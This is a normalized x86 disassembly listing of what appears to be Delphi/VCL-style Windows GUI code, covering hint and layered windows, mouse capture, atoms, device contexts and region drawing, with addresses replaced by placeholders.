mov esp ebp
pop ebp
retn 0xc
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
mov eax ebx
call sub_49b0d4
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_432a5c
lea edx [ ebp - 0xc ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_499d18
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x14
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax esi
xor edx edx
call sub_48deb0
jmp r-xdata
mov eax esi
call sub_47dde4
jmp r-xdata
sub_49bc10
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov esi edx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_49bcf3
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov ebx eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
call sub_449d2c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49bcfa
lea eax [ ebp - 0x24 ]
call j_sub_449348
retn
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_48d81c
lea ecx [ ebp - 0x20 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi ]
mov eax [ ebp - 0x20 ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
mov edx [ ebx + 0x48 ]
sub edx eax
mov eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov edx [ ebx + 0x4c ]
sub edx eax
mov eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_48df68
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
call sub_449d2c
mov eax [ ebp - 0xc ]
mov edi eax
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub eax 0x12
jne r-xdata
sub_49bd04
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_448694
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_49bf08
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_49bd94
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x2c ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x20 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
call sub_49bee0
xor ecx ecx
mov dl 0x1
mov eax [ ebx + 0x2c ]
call [ eax + 0x2c ]
mov [ ebx + 0x28 ] eax
sub_49bdc0
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_49beb8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_49be20
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xe0 ]
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_49be60
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoW
sub_49be90
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_41d438
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_49beb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_49bdf0
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_49bee0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x28 ] esi
lea eax [ ebx + 0x28 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
sub_49bf08
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_49be44
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_49be60
pop ebx
retn
mov eax ebx
call sub_49be90
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageW
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoW
jmp r-xdata
sub_49bf6c
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_49c0d2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleW
mov ebx eax
push r-xdata
push ebx
call sub_41d36c
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryW
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
sub_49c2c8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_49c2ac
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_49c2ac
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
movzx edx bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_49c3b4
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4481b0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4481b0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4481b0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_4481b0
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_4481b0
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
xor edx edx
call sub_449d2c
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
xor edx edx
call sub_449d2c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_49c454
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_49c5df
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_436540
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_449d2c
mov eax [ rw-data ]
call sub_449db8
push eax
call GlobalAddAtomW
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_436540
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_449d2c
mov eax [ rw-data ]
call sub_449db8
push eax
call GlobalAddAtomW
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_449db8
push eax
call RegisterWindowMessageW
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4249e8
mov [ rw-data ] eax
call sub_49bf6c
mov dl 0x1
mov eax [ r-xdata ]
call sub_49bd04
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47f368
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_480728
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_482cc0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_48ccfc
mov [ rw-data ] eax
push r-xdata
call GetModuleHandleW
mov ebx eax
mov ecx r-xdata
mov edx sub_48aa8c
mov eax [ r-xdata ]
call sub_423ecc
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49c5e6
lea eax [ ebp - 0x10 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
push r-xdata
push ebx
call sub_41d36c
mov [ rw-data ] eax
sub_49c68c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov [ edi + 0x4 ] esi
mov eax [ edi ]
mov edx edi
call [ eax + 0x14 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_49c6d0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_424e90
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_49c74c
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0xc ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
sub_49c7a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor edx edx
push ebp
push sub_49c87f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_490de0
test al al
je r-xdata
mov [ ebx + 0x170 ] 0x1
or [ ebx + 0x54 ] 0x4000
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx edi
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ ebx + 0x170 ] 0x0
and [ ebx + 0x54 ] 0xbfff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx eax
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x10 ]
mov ecx [ ebp + 0x10 ]
sub ecx edx
push ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x14 ]
mov ecx [ ebp + 0xc ]
sub ecx edx
push ecx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
add ecx edi
mov edx eax
add edx esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_49c890
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp edx 0x7
ja r-xdata
jmp [ edx * 4 + jump_table_49c8af ]
mov eax [ ebx + 0x4 ]
call sub_490de0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_490de0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_490de0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_490de0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_490de0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_490de0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_490de0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_490de0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x40 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x44 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x18c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x190 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x194 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x198 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x40 ]
sub eax [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x44 ]
sub eax [ ebx + 0xc ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x8 ]
add eax [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4c ]
add eax [ ebx + 0xc ]
add eax [ ebx + 0x14 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x18c ]
sub eax [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x190 ]
sub eax [ ebx + 0xc ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x194 ]
add eax [ ebx + 0x8 ]
add eax [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x198 ]
add eax [ ebx + 0xc ]
add eax [ ebx + 0x14 ]
jmp r-xdata
sub_49ca70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_498aa8
xor edx edx
mov eax esi
call sub_48deb0
mov edx 0x80ffff
mov eax esi
call sub_48e120
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x78 ]
mov eax [ esi + 0x260 ]
call sub_46e7e4
mov eax [ esi + 0x260 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_46e058
xor edx edx
mov eax esi
call sub_48d5f8
xor edx edx
mov eax esi
call sub_48d62c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_49cb10
push ebx
mov ebx eax
mov eax ebx
call sub_4927d4
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
pop ebx
retn
push 0xffffffec
mov eax ebx
call sub_496868
push eax
call GetWindowLongW
or eax 0x80000
push eax
push 0xffffffec
mov eax ebx
call sub_496868
push eax
call SetWindowLongW
push 0x3
push 0x0
push 0xff00
mov eax ebx
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_49cbac
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
mov eax esi
call sub_49ca58
mov edx [ esp + 0xc ]
mov eax esi
call sub_48d5c4
mov eax esp
call sub_432a48
mov edx eax
sar edx 0x1
jns r-xdata
add edx [ esp ]
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
adc edx 0x0
sub edx eax
mov eax esi
call sub_48d590
mov eax [ esi + 0x268 ]
cmp [ eax + 0x40 ] 0x1
jne r-xdata
adc eax 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47f5f8
sar eax 0x1
jns r-xdata
mov edx [ esi + 0x40 ]
add edx 0xa
mov eax esi
call sub_48d590
cmp eax [ esi + 0x44 ]
setl bl
mov [ esi + 0x26c ] bl
test bl bl
je r-xdata
adc eax 0x0
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax esp
call sub_432a50
mov edx [ esi + 0x44 ]
sub edx [ esi + 0x4c ]
sub edx eax
mov eax esi
call sub_48d5c4
sub_49cc50
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ esp + 0x4 ]
push edi
lea eax [ esp + 0xc ]
push eax
mov esi [ esp + 0x8 ]
mov ecx esi
mov edx edi
mov eax esi
call sub_432a2c
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_49cbac
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_49cc94
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_49ccea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49ccf1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ReleaseDC
retn
sub_49ccf8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_49423c
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
pop esi
pop ebx
retn
sub_49cd1c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov ebx edx
xor eax eax
mov [ esp ] eax
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
xor esi esi
mov edi [ ebx + 0x268 ]
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ edi + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x260 ]
mov eax [ eax + 0xc ]
call sub_46d95c
test al 0x1
setne al
mov [ esp + 0x8 ] al
mov eax [ ebx + 0x260 ]
mov ebp [ eax + 0xc ]
mov eax ebp
call sub_46d95c
mov edx eax
or dl [ r-xdata ]
mov eax ebp
call sub_46d968
mov eax [ r-xdata ]
push eax
lea ecx [ edi + 0x30 ]
lea edx [ esp + 0x10 ]
mov eax [ ebx + 0x260 ]
call sub_46e5d4
cmp [ esp + 0x8 ] 0x0
jne r-xdata
add [ esp + 0x4 ] esi
add [ esp ] ebp
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_48d62c
mov edx [ esp ]
mov eax ebx
call sub_48d5f8
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ r-xdata ]
push eax
lea ecx [ edi + 0x34 ]
lea edx [ esp + 0x10 ]
mov eax [ ebx + 0x260 ]
call sub_46e5d4
lea eax [ esp + 0xc ]
call sub_432a48
add eax 0x8
cmp eax ebp
jge r-xdata
lea eax [ esp + 0xc ]
call sub_432a48
mov ebp eax
add ebp 0x8
lea eax [ esp + 0xc ]
call sub_432a50
add esi eax
add esi 0x4
mov eax [ ebx + 0x260 ]
mov ebp [ eax + 0xc ]
mov eax ebp
call sub_46d95c
movzx edx [ r-xdata ]
not edx
and dl al
mov eax ebp
call sub_46d968
mov ebp eax
lea eax [ esp + 0xc ]
call sub_432a50
add esi eax
add esi 0x4
mov eax ebp
sub_49ce5c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42e278
mov [ esi + 0x50 ] 0xffffffff
mov [ esi + 0x40 ] 0x1
xor eax eax
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] 0x1f4
mov [ esi + 0x4c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_49ceac
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_49cf04
mov [ esi + 0x58 ] 0x1
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42e2c4
test bl bl
jle r-xdata
call sub_49d9e4
mov eax [ esi + 0x44 ]
call sub_4481b0
xor eax eax
mov [ esi + 0x44 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_49cf10
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_42e5b0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_49ce44
sub_49cf3c
push ebx
push esi
push edi
add esp 0xffffffb0
mov ebx edx
push esp
lea edx [ esp + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x44 ]
mov ecx [ ebx + 0x4c ]
mov dl 0x3
call sub_432864
mov eax [ ebx + 0x260 ]
mov eax [ eax + 0x14 ]
mov edx 0xb0ffff
call sub_46df1c
lea edx [ esp + 0x40 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x40 ]
mov eax [ ebx + 0x260 ]
call sub_46e300
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
call CreateRectRgn
mov esi eax
push esi
mov eax [ ebx + 0x260 ]
call sub_46e8c8
push eax
call SelectObject
mov edi eax
mov eax [ ebx + 0x260 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_46df1c
push 0x1
push 0x1
mov eax [ ebx + 0x260 ]
mov eax [ eax + 0x14 ]
call sub_46df70
push eax
push esi
mov eax [ ebx + 0x260 ]
call sub_46e8c8
push eax
call FrameRgn
cmp [ ebx + 0x274 ] 0x0
je r-xdata
push esi
push edi
lea esi [ esp + 0x8 ]
lea edi [ esp + 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
push 0x3fe00000
push 0x0
lea ecx [ esp + 0x18 ]
mov dl 0x2
lea eax [ esp + 0x8 ]
call sub_4328c0
jmp r-xdata
push esi
push edi
lea esi [ esp + 0x8 ]
lea edi [ esp + 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
push 0x3fe00000
push 0x0
lea ecx [ esp + 0x28 ]
mov dl 0x3
lea eax [ esp + 0x8 ]
call sub_4328c0
jmp r-xdata
cmp [ ebx + 0x270 ] 0x0
je r-xdata
mov eax [ ebx + 0x260 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_46e058
mov eax [ r-xdata ]
push eax
lea ecx [ ebx + 0x270 ]
lea edx [ esp + 0x34 ]
mov eax [ ebx + 0x260 ]
call sub_46e5d4
lea ecx [ esp + 0x40 ]
lea edx [ esp + 0x30 ]
lea eax [ esp + 0x10 ]
call sub_432970
push esi
push edi
lea esi [ esp + 0x48 ]
lea edi [ esp + 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ r-xdata ]
push eax
lea ecx [ ebx + 0x270 ]
lea edx [ esp + 0x14 ]
